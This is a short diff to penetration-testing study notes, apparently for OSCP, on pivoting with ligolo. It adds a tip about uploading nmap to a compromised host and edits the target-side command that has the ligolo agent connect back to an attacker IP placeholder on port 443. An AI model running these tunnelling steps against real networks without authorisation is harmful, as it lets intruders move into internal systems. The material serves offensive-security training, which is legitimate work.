@@ -1,6 +1,10 @@
-# Pivoting
+# Pivoting (Tunneling & Forwarding)
 
 {% embed url="https://www.reddit.com/r/oscp/comments/1akvtwe/ligolo_chisel_and_painfully_slow_nmap_scans/" fullWidth="false" %}
+
+{% hint style="info" %}
+Upload nmap binary to compromised machine and scan from there instead of scanning via ligolo incase it don't work
+{% endhint %}
 
 {% embed url="https://medium.com/@raphaeltzy13/pivoting-with-ligolo-active-directory-82a86d739409" %}
 
@@ -25,7 +29,7 @@ ligolo -selfcert -laddr 0.0.0.0:443
 #Accepts connections at port 443
 
 TARGET
-.\agent.exe -connect <attacker IP here>:443 -ignore-cert
+.\agent.exe -connect <attacker IP here>:443 -retry -ignore-cert
 
 KALI
 session
